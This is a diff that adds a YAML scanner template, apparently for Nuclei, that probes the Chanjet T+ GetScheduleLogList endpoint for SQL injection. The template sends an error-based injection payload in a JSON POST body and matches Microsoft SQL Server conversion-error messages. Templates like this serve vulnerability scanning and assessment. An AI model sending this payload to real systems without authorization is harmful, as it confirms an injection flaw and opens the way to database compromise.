@@ -1,0 +1,27 @@
+id: poc-yaml-changjie-tplus-getscheduleloglist-sqli
+info:
+  name: 畅捷通 T+ GetScheduleLogList SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in Changjie T+ GetScheduleLogList endpoint.
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/tplus/ajaxpro/Ufida.T.SM.UIP.ScheduleManage.ScheduleManageController,Ufida.T.SM.UIP.ashx?method=GetScheduleLogList"
+    headers:
+      Content-Type: application/json
+    body: '{"scheduleName":"'' AND 1 IN (SELECT @@version) AND ''1''=''1"}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "在将 nvarchar 值"
+          - "Microsoft SQL Server"
+          - "转换成数据类型 int 时失败"
